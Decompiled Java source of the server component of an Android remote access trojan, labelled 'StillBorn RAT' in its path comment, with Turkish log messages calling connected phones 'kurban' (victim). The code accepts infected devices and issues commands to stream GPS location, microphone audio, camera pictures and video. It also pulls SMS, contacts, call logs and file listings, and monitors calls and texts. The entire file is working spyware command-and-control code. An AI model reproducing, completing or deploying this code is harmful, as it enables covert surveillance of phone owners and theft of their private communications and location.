/*   1:    */ package server;
/*   2:    */ 
/*   3:    */ import Packet.AdvancedInformationPacket;
/*   4:    */ import Packet.CallLogPacket;
/*   5:    */ import Packet.CallStatusPacket;
/*   6:    */ import Packet.CommandPacket;
/*   7:    */ import Packet.ContactsPacket;
/*   8:    */ import Packet.FilePacket;
/*   9:    */ import Packet.FileTreePacket;
/*  10:    */ import Packet.GPSPacket;
/*  11:    */ import Packet.LogPacket;
/*  12:    */ import Packet.Packet;
/*  13:    */ import Packet.PreferencePacket;
/*  14:    */ import Packet.RawPacket;
/*  15:    */ import Packet.SMSTreePacket;
/*  16:    */ import Packet.ShortSMSPacket;
/*  17:    */ import Packet.TransportPacket;
/*  18:    */ import gui.GUI;
/*  19:    */ import handler.AdvInfoHandler;
/*  20:    */ import handler.CallLogHandler;
/*  21:    */ import handler.CallMonitorHandler;
/*  22:    */ import handler.ChannelDistributionHandler;
/*  23:    */ import handler.ClientLogHandler;
/*  24:    */ import handler.ContactsHandler;
/*  25:    */ import handler.FileHandler;
/*  26:    */ import handler.FileTreeHandler;
/*  27:    */ import handler.GPSHandler;
/*  28:    */ import handler.PacketHandler;
/*  29:    */ import handler.PictureHandler;
/*  30:    */ import handler.PreferenceHandler;
/*  31:    */ import handler.SMSHandler;
/*  32:    */ import handler.SMSMonitorHandler;
/*  33:    */ import handler.SoundHandler;
/*  34:    */ import handler.TemporaryStorage;
/*  35:    */ import handler.VideoHandler;
/*  36:    */ import inout.Controler;
/*  37:    */ import inout.Protocol;
/*  38:    */ import java.io.BufferedWriter;
/*  39:    */ import java.io.File;
/*  40:    */ import java.io.FileInputStream;
/*  41:    */ import java.io.FileNotFoundException;
/*  42:    */ import java.io.FileWriter;
/*  43:    */ import java.io.IOException;
/*  44:    */ import java.net.ServerSocket;
/*  45:    */ import java.net.Socket;
/*  46:    */ import java.util.HashMap;
/*  47:    */ import java.util.Scanner;
/*  48:    */ 
/*  49:    */ public class Server
/*  50:    */   implements Controler
/*  51:    */ {
/*  52:    */   private ServerSocket serverSocket;
/*  53:    */   private int serverPort;
/*  54: 74 */   private boolean online = true;
/*  55:    */   private int Nclient;
/*  56:    */   private GUI gui;
/*  57:    */   private HashMap<String, ClientHandler> clientMap;
/*  58:    */   private HashMap<String, ChannelDistributionHandler> channelHandlerMap;
/*  59:    */   
/*  60:    */   public Server(int port)
/*  61:    */   {
/*  62: 82 */     if (port == 0) {
/*  63:    */       try
/*  64:    */       {
/*  65: 84 */         Scanner sc = new Scanner(new FileInputStream("config.txt"));
/*  66: 85 */         if (sc.hasNextInt()) {
/*  67: 85 */           port = sc.nextInt();
/*  68:    */         }
/*  69:    */       }
/*  70:    */       catch (Exception e)
/*  71:    */       {
/*  72: 87 */         port = 9999;
/*  73:    */       }
/*  74:    */     }
/*  75: 91 */     this.Nclient = 0;
/*  76: 92 */     this.serverPort = port;
/*  77: 93 */     this.clientMap = new HashMap();
/*  78: 94 */     this.channelHandlerMap = new HashMap();
/*  79:    */     
/*  80: 96 */     this.gui = new GUI(this, this.serverPort);
/*  81:    */     try
/*  82:    */     {
/*  83: 99 */       this.serverSocket = new ServerSocket(this.serverPort);
/*  84:    */     }
/*  85:    */     catch (IOException e)
/*  86:    */     {
/*  87:101 */       e.printStackTrace();
/*  88:    */     }
/*  89:104 */     setOnline();
/*  90:    */   }
/*  91:    */   
/*  92:    */   public static void main(String[] args)
/*  93:    */   {
/*  94:109 */     Server s = new Server(0);
/*  95:    */   }
/*  96:    */   
/*  97:    */   public void savePortConfig(String newPort)
/*  98:    */   {
/*  99:    */     try
/* 100:    */     {
/* 101:114 */       BufferedWriter bw = new BufferedWriter(new FileWriter(new File("config.txt"), false));
/* 102:115 */       bw.write(newPort);
/* 103:116 */       bw.close();
/* 104:    */     }
/* 105:    */     catch (FileNotFoundException e)
/* 106:    */     {
/* 107:118 */       this.gui.logErrTxt("config.txt bulunamadı!");
/* 108:    */     }
/* 109:    */     catch (IOException e)
/* 110:    */     {
/* 111:120 */       this.gui.logErrTxt("Yeni port config.txt dosyasına kaydedilemedi.");
/* 112:    */     }
/* 113:    */   }
/* 114:    */   
/* 115:    */   public void setOnline()
/* 116:    */   {
/* 117:125 */     while (this.online)
/* 118:    */     {
/* 119:126 */       this.gui.logTxt("SERVER online, kurban bekleniyor...");
/* 120:    */       try
/* 121:    */       {
/* 122:129 */         Socket cs = this.serverSocket.accept();
/* 123:    */         
/* 124:    */ 
/* 125:132 */         String id = this.Nclient + "client";
/* 126:133 */         ClientHandler newCH = new ClientHandler(cs, id, this, this.gui);
/* 127:134 */         this.clientMap.put(id, newCH);
/* 128:135 */         this.channelHandlerMap.put(id, new ChannelDistributionHandler());
/* 129:    */         
/* 130:137 */         newCH.start();
/* 131:    */         
/* 132:139 */         this.gui.logTxt("Bağlantı kuruldu, IMEI atandı : " + id);
/* 133:    */       }
/* 134:    */       catch (IOException e)
/* 135:    */       {
/* 136:143 */         this.gui.logErrTxt("Bağlantı kurulurken hata oluştu");
/* 137:    */       }
/* 138:    */     }
/* 139:147 */     this.gui.logTxt("*** SERVER DURDURULDU ***\n");
/* 140:    */   }
/* 141:    */   
/* 142:    */   public void setOffline()
/* 143:    */   {
/* 144:151 */     this.online = false;
/* 145:    */   }
/* 146:    */   
/* 147:    */   public void Storage(TransportPacket p, String i)
/* 148:    */   {
/* 149:156 */     int result = 0;
/* 150:157 */     int chan = p.getChannel();
/* 151:161 */     if (!this.channelHandlerMap.containsKey(i))
/* 152:    */     {
/* 153:162 */       this.gui.logTxt("hata: alınan bilgi bilinmeyen kaynaktan");
/* 154:163 */       return;
/* 155:    */     }
/* 156:164 */     if ((((ChannelDistributionHandler)this.channelHandlerMap.get(i)).getPacketMap(chan) == null) || 
/* 157:165 */       (((ChannelDistributionHandler)this.channelHandlerMap.get(i)).getStorage(chan) == null))
/* 158:    */     {
/* 159:167 */       this.gui.logErrTxt("HATA: alınan bilgi bilinmeyen kanalda");
/* 160:168 */       return;
/* 161:    */     }
/* 162:170 */     result = ((ChannelDistributionHandler)this.channelHandlerMap.get(i)).getStorage(chan).addPacket(p);
/* 163:172 */     if (result == 0) {
/* 164:173 */       this.gui.logErrTxt("HATA: paket kaybı.");
/* 165:175 */     } else if (result == 1) {
/* 166:176 */       this.gui.logErrTxt("HATA: son paket zaten alındı (başka paket beklenmiyor)");
/* 167:178 */     } else if (result == 2) {
/* 168:179 */       this.gui.logErrTxt("HATA: bilgi tamamlanamadı, boyut hatası");
/* 169:180 */     } else if (result == 3) {
/* 170:182 */       dataHandlerStarter(chan, i);
/* 171:    */     }
/* 172:    */   }
/* 173:    */   
/* 174:    */   public void dataHandlerStarter(int channel, String imei)
/* 175:    */   {
/* 176:191 */     if ((((ChannelDistributionHandler)this.channelHandlerMap.get(imei)).getStorage(channel) == null) || 
/* 177:192 */       (((ChannelDistributionHandler)this.channelHandlerMap.get(imei)).getPacketMap(channel) == null) || 
/* 178:193 */       (((ChannelDistributionHandler)this.channelHandlerMap.get(imei)).getPacketHandlerMap(channel) == null))
/* 179:    */     {
/* 180:196 */       this.gui.logErrTxt("HATA: kullanılan kanalda handler sınıfı bulunamadı " + 
/* 181:197 */         channel);
/* 182:198 */       return;
/* 183:    */     }
/* 184:201 */     byte[] final_data = ((ChannelDistributionHandler)this.channelHandlerMap.get(imei)).getStorage(channel)
/* 185:202 */       .getFinalData();
/* 186:    */     
/* 187:    */ 
/* 188:205 */     Packet p = ((ChannelDistributionHandler)this.channelHandlerMap.get(imei)).getPacketMap(channel);
/* 189:206 */     p.parse(final_data);
/* 190:    */     
/* 191:    */ 
/* 192:209 */     PacketHandler handler = ((ChannelDistributionHandler)this.channelHandlerMap.get(imei)).getPacketHandlerMap(channel);
/* 193:    */     
/* 194:    */ 
/* 195:212 */     handler.handlePacket(p, imei, this);
/* 196:    */   }
/* 197:    */   
/* 198:    */   public void commandSender(String imei, short command, byte[] args)
/* 199:    */   {
/* 200:    */     try
/* 201:    */     {
/* 202:230 */       channel = ((ChannelDistributionHandler)this.channelHandlerMap.get(imei)).getFreeChannel();
/* 203:    */     }
/* 204:    */     catch (NullPointerException e)
/* 205:    */     {
/* 206:    */       int channel;
/* 207:232 */       this.gui.logErrTxt("Kurban artık erişilemez. Komut gönderilemedi: " + command); return;
/* 208:    */     }
/* 209:    */     int channel;
/* 210:236 */     if (command == Protocol.GET_GPS_STREAM)
/* 211:    */     {
/* 212:237 */       if (!((ChannelDistributionHandler)this.channelHandlerMap.get(imei)).registerListener(channel, new GPSPacket())) {
/* 213:238 */         this.gui.logErrTxt("HATA: Sanal kanal " + channel + " zaten kayıtlı!");
/* 214:    */       }
/* 215:239 */       ((ChannelDistributionHandler)this.channelHandlerMap.get(imei)).registerHandler(channel, new GPSHandler(channel, imei, this.gui));
/* 216:240 */       this.gui.saveMapChannel(imei, channel);
/* 217:    */     }
/* 218:242 */     else if (command == Protocol.GET_ADV_INFORMATIONS)
/* 219:    */     {
/* 220:243 */       if (!((ChannelDistributionHandler)this.channelHandlerMap.get(imei)).registerListener(channel, new AdvancedInformationPacket())) {
/* 221:244 */         this.gui.logErrTxt("HATA: kanal " + channel + " kullanımda!");
/* 222:    */       }
/* 223:245 */       ((ChannelDistributionHandler)this.channelHandlerMap.get(imei)).registerHandler(channel, new AdvInfoHandler(channel, imei, this.gui));
/* 224:    */     }
/* 225:247 */     else if (command == 21)
/* 226:    */     {
/* 227:248 */       if (!((ChannelDistributionHandler)this.channelHandlerMap.get(imei)).registerListener(channel, new PreferencePacket())) {
/* 228:249 */         this.gui.logErrTxt("HATA: kanal " + channel + " kullanımda!");
/* 229:    */       }
/* 230:250 */       ((ChannelDistributionHandler)this.channelHandlerMap.get(imei)).registerHandler(channel, new PreferenceHandler(channel, imei, this.gui));
/* 231:    */     }
/* 232:252 */     else if (command == Protocol.GET_SOUND_STREAM)
/* 233:    */     {
/* 234:253 */       if (!((ChannelDistributionHandler)this.channelHandlerMap.get(imei)).registerListener(channel, new RawPacket())) {
/* 235:254 */         this.gui.logErrTxt("HATA: kanal " + channel + " kullanımda!");
/* 236:    */       }
/* 237:255 */       ((ChannelDistributionHandler)this.channelHandlerMap.get(imei)).registerHandler(channel, new SoundHandler(channel, imei, this.gui));
/* 238:256 */       this.gui.saveSoundChannel(imei, channel);
/* 239:    */     }
/* 240:258 */     else if (command == Protocol.GET_PICTURE)
/* 241:    */     {
/* 242:259 */       if (!((ChannelDistributionHandler)this.channelHandlerMap.get(imei)).registerListener(channel, new RawPacket())) {
/* 243:260 */         this.gui.logErrTxt("HATA: kanal " + channel + " kullanımda!");
/* 244:    */       }
/* 245:261 */       ((ChannelDistributionHandler)this.channelHandlerMap.get(imei)).registerHandler(channel, new PictureHandler(channel, imei, this.gui));
/* 246:262 */       this.gui.savePictureChannel(imei, channel);
/* 247:    */     }
/* 248:264 */     else if (command == Protocol.LIST_DIR)
/* 249:    */     {
/* 250:265 */       if (!((ChannelDistributionHandler)this.channelHandlerMap.get(imei)).registerListener(channel, new FileTreePacket())) {
/* 251:266 */         this.gui.logErrTxt("HATA: kanal " + channel + " kullanımda!");
/* 252:    */       }
/* 253:267 */       ((ChannelDistributionHandler)this.channelHandlerMap.get(imei)).registerHandler(channel, new FileTreeHandler(channel, imei, this.gui));
/* 254:    */     }
/* 255:269 */     else if (command == Protocol.GET_CALL_LOGS)
/* 256:    */     {
/* 257:270 */       if (!((ChannelDistributionHandler)this.channelHandlerMap.get(imei)).registerListener(channel, new CallLogPacket())) {
/* 258:271 */         this.gui.logErrTxt("HATA: kanal " + channel + " kullanımda!");
/* 259:    */       }
/* 260:272 */       ((ChannelDistributionHandler)this.channelHandlerMap.get(imei)).registerHandler(channel, new CallLogHandler(channel, imei, this.gui));
/* 261:273 */       this.gui.saveCallLogChannel(imei, channel);
/* 262:    */     }
/* 263:275 */     else if (command == Protocol.GET_SMS)
/* 264:    */     {
/* 265:276 */       if (!((ChannelDistributionHandler)this.channelHandlerMap.get(imei)).registerListener(channel, new SMSTreePacket())) {
/* 266:277 */         this.gui.logErrTxt("HATA: kanal " + channel + " kullanımda!");
/* 267:    */       }
/* 268:278 */       ((ChannelDistributionHandler)this.channelHandlerMap.get(imei)).registerHandler(channel, new SMSHandler(channel, imei, this.gui));
/* 269:279 */       this.gui.saveSMSChannel(imei, channel);
/* 270:    */     }
/* 271:281 */     else if (command == Protocol.GET_CONTACTS)
/* 272:    */     {
/* 273:282 */       if (!((ChannelDistributionHandler)this.channelHandlerMap.get(imei)).registerListener(channel, new ContactsPacket())) {
/* 274:283 */         this.gui.logErrTxt("HATA: kanal " + channel + " kullanımda!");
/* 275:    */       }
/* 276:284 */       ((ChannelDistributionHandler)this.channelHandlerMap.get(imei)).registerHandler(channel, new ContactsHandler(channel, imei, this.gui));
/* 277:285 */       this.gui.saveContactChannel(imei, channel);
/* 278:    */     }
/* 279:287 */     else if (command == Protocol.MONITOR_CALL)
/* 280:    */     {
/* 281:288 */       if (!((ChannelDistributionHandler)this.channelHandlerMap.get(imei)).registerListener(channel, new CallStatusPacket())) {
/* 282:289 */         this.gui.logErrTxt("HATA: kanal " + channel + " kullanımda!");
/* 283:    */       }
/* 284:290 */       ((ChannelDistributionHandler)this.channelHandlerMap.get(imei)).registerHandler(channel, new CallMonitorHandler(channel, imei, this.gui));
/* 285:291 */       this.gui.saveMonitorCallChannel(imei, channel);
/* 286:    */     }
/* 287:293 */     else if (command == Protocol.MONITOR_SMS)
/* 288:    */     {
/* 289:294 */       if (!((ChannelDistributionHandler)this.channelHandlerMap.get(imei)).registerListener(channel, new ShortSMSPacket())) {
/* 290:295 */         this.gui.logErrTxt("HATA: kanal " + channel + " kullanımda!");
/* 291:    */       }
/* 292:296 */       ((ChannelDistributionHandler)this.channelHandlerMap.get(imei)).registerHandler(channel, new SMSMonitorHandler(channel, imei, this.gui));
/* 293:297 */       this.gui.saveMonitorSMSChannel(imei, channel);
/* 294:    */     }
/* 295:299 */     else if (command == 2)
/* 296:    */     {
/* 297:300 */       ((ChannelDistributionHandler)this.channelHandlerMap.get(imei)).registerListener(channel, new CommandPacket());
/* 298:301 */       ((ChannelDistributionHandler)this.channelHandlerMap.get(imei)).registerListener(1, new LogPacket());
/* 299:302 */       ((ChannelDistributionHandler)this.channelHandlerMap.get(imei)).registerHandler(1, new ClientLogHandler(channel, imei, this.gui));
/* 300:    */     }
/* 301:304 */     else if (command == Protocol.GET_VIDEO_STREAM)
/* 302:    */     {
/* 303:305 */       if (!((ChannelDistributionHandler)this.channelHandlerMap.get(imei)).registerListener(channel, new RawPacket())) {
/* 304:306 */         this.gui.logErrTxt("HATA: kanal " + channel + " kullanımda!");
/* 305:    */       }
/* 306:307 */       ((ChannelDistributionHandler)this.channelHandlerMap.get(imei)).registerHandler(channel, new VideoHandler(channel, imei, this.gui));
/* 307:308 */       this.gui.saveVideoChannel(imei, channel);
/* 308:    */     }
/* 309:351 */     byte[] nullArgs = new byte[0];
/* 310:352 */     if (args == null) {
/* 311:353 */       args = nullArgs;
/* 312:    */     }
/* 313:354 */     ((ClientHandler)this.clientMap.get(imei)).toMux(command, channel, args);
/* 314:    */   }
/* 315:    */   
/* 316:    */   public void commandFileSender(String imei, short command, byte[] args, String dir, String name)
/* 317:    */   {
/* 318:358 */     int channel = ((ChannelDistributionHandler)this.channelHandlerMap.get(imei)).getFreeChannel();
/* 319:360 */     if (!((ChannelDistributionHandler)this.channelHandlerMap.get(imei)).registerListener(channel, new FilePacket())) {
/* 320:361 */       this.gui.logErrTxt("HATA: kanal " + channel + " kullanımda!");
/* 321:    */     }
/* 322:363 */     ((ChannelDistributionHandler)this.channelHandlerMap.get(imei)).registerHandler(channel, new FileHandler(channel, imei, this.gui, dir, name));
/* 323:    */     
/* 324:    */ 
/* 325:366 */     byte[] nullArgs = new byte[0];
/* 326:367 */     if (args == null) {
/* 327:367 */       args = nullArgs;
/* 328:    */     }
/* 329:368 */     ((ClientHandler)this.clientMap.get(imei)).toMux(command, channel, args);
/* 330:    */   }
/* 331:    */   
/* 332:    */   public void commandStopSender(String imei, short command, byte[] args, int channel)
/* 333:    */   {
/* 334:374 */     ((ChannelDistributionHandler)this.channelHandlerMap.get(imei)).removeListener(channel);
/* 335:    */     
/* 336:376 */     byte[] nullArgs = new byte[0];
/* 337:377 */     if (args == null) {
/* 338:378 */       args = nullArgs;
/* 339:    */     }
/* 340:379 */     ((ClientHandler)this.clientMap.get(imei)).toMux(command, channel, args);
/* 341:    */   }
/* 342:    */   
/* 343:    */   public void DeleteClientHandler(String i)
/* 344:    */   {
/* 345:384 */     if ((this.clientMap.containsKey(i)) && (this.channelHandlerMap.containsKey(i)))
/* 346:    */     {
/* 347:386 */       this.clientMap.remove(i);
/* 348:387 */       this.channelHandlerMap.remove(i);
/* 349:388 */       this.gui.deleteUser(i);
/* 350:389 */       this.gui.logTxt("Kurban " + i + " zaman aşımından dolayı silindi");
/* 351:    */     }
/* 352:    */     else
/* 353:    */     {
/* 354:393 */       this.gui.logErrTxt(i + "kurban bilgisi kurban çıkış yaptıktan sonra silinemez");
/* 355:    */     }
/* 356:    */   }
/* 357:    */   
/* 358:    */   public GUI getGui()
/* 359:    */   {
/* 360:397 */     return this.gui;
/* 361:    */   }
/* 362:    */   
/* 363:    */   public HashMap<String, ClientHandler> getClientMap()
/* 364:    */   {
/* 365:401 */     return this.clientMap;
/* 366:    */   }
/* 367:    */   
/* 368:    */   public HashMap<String, ChannelDistributionHandler> getChannelHandlerMap()
/* 369:    */   {
/* 370:405 */     return this.channelHandlerMap;
/* 371:    */   }
/* 372:    */ }


/* Location:           C:\Users\SmileyFacedHacker\Downloads\StillBorn RAT (Android)\StillBorn RAT (Android)\StillBornRAT.jar
 * Qualified Name:     server.Server
 * JD-Core Version:    0.7.0.1
 */